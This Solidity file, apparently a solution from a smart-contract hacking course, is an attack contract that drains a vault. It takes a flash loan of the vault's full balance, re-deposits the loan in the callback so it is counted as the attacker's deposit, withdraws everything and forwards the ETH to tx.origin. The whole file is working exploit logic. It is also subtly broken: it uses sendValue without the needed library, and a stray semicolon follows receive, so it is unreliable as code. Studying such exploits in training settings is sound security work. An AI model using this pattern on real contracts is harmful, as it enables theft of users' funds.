// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE
// https://smartcontractshacking.com/#copyright-policy
pragma solidity ^0.8.13;


    interface IVault{
        function depositETH() external payable;
        function withdrawETH() external;
        function flashLoanETH(uint256 amount) external;
    }

contract Attack{
    IVault vault;
    constructor(address _vaultAddress) {
        vault = IVault(_vaultAddress);
    }

    function attack() external{
        vault.flashLoanETH(address(vault).balance);
        vault.withdrawETH();
    }

    function callBack() external payable{
        vault.depositETH{value: msg.value}();
    }



    receive() external payable{
        payable(tx.origin).sendValue(msg.value);
    };
} 